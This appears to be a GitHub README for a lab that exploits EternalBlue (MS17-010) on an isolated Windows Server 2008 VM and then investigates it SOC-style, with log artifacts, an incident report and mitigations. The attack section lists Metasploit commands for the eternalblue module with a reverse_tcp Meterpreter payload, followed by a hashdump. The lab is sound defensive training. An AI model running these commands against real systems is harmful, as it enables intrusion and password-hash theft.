# External-Blue-Lab

# Objective
This lab demonstrates the exploitation of the EternalBlue (MS17-010) vulnerability against a vulnerable Windows machine, followed by a SOC-style investigation. The purpose is educational — to learn how to detect, investigate, and report such incidents in a safe environment

 # Lab Setup
- Victim Machine (Windows Server 2008 R2):
- Install Windows Server 2008 R2 from ISO.
- Do not apply Windows Updates.
- Ensure SMBv1 is enabled.
- IP: -.-.-.-
- Attacker Machine (Kali Linux):
- Kali Linux with Metasploit.
- IP: -.-.-.-
Networking:
- Both VMs in Host-Only or Internal Network mode.

# 🚀 Attack Simulation (EternalBlue Exploit)
- Vulnerability Scan : nmap -p 445 --script=smb-vuln-ms17-010 -.-.-.-
    - If vulnerable, Nmap output will show: VULNERABLE: MS17-010
- Launching Exploit (Metasploit)
- msfconsole
    - use exploit/windows/smb/ms17_010_eternalblue
    - set RHOSTS 192.168.56.101
    - set LHOST 192.168.56.102
    - set payload windows/x64/meterpreter/reverse_tcp
    - exploit

### Post-Exploitation

- Once successful, you will get a Meterpreter session. Example commands
    - sysinfo
    - getuid
    - hashdump

# As a SOC Analyst, the investigation focuses on identifying Indicators of Compromise (IoCs).
### 🕵️ SOC Investigation & Forensics

##### * Forensic Artifacts (Post-Exploitation Traces)
- Windows Security Logs
- Event ID 4624 – Successful Logon
- LogonType = 3 (Network) → indicates SMB logon.
- Account Name = ANONYMOUS LOGON (initial SMB session).
- Source IP = attacker’s IP (-.-.-.-).
- Authentication package: NTLM.

➡ This is one of the first footprints of EternalBlue: unusual Anonymous Network Logons from an external/untrusted IP.

### SOC Incident Report
- Incident Title: Exploitation of MS17-010 (EternalBlue) Vulnerability
- Summary: Suspicious SMB traffic on port 445 was detected from 192.168.56.102 to 192.168.56.101. Logs confirm unauthorized access via EternalBlue exploit. The attacker obtained system-level access and dumped password hashes.
- Indicators of Compromise (IoCs):
- Repeated SMB traffic from 192.168.56.102 → 192.168.56.101:445
- Windows Security Event 4624 (Logon Type 3) from remote attacker IP
- Sysmon Event 1: cmd.exe launched by services.exe
  
## Mitigation Steps:
- Apply Microsoft security patch MS17-010.
- Disable SMBv1.
- Monitor network for abnormal SMB traffic




<img width="1920" height="1080" alt="nmap scan" src="https://github.com/user-attachments/assets/17766df5-f34c-451e-bcec-4fbf8da4241a" />
Scan Vulnerability with namp tool

<img width="1920" height="1080" alt="msfconsole use exploit " src="https://github.com/user-attachments/assets/410fff8a-4b33-4ace-a434-42207d8b22ec" />
use metasploit framework and use exploit module for ExternalBlue Vulnerability

<img width="1920" height="1080" alt="set options" src="https://github.com/user-attachments/assets/179d084c-b0bd-4fad-801f-3233ae8792f5" />
Set Option 

<img width="1920" height="1080" alt="successful meterpreter" src="https://github.com/user-attachments/assets/9a233bc3-5cd9-4c8f-a75a-ffaf81fe1df2" />
meterpreter full access 



<img width="1920" height="1080" alt="anonymous logon" src="https://github.com/user-attachments/assets/1047fc09-7414-43ba-ae78-e2b332c6720e" />
investigation 






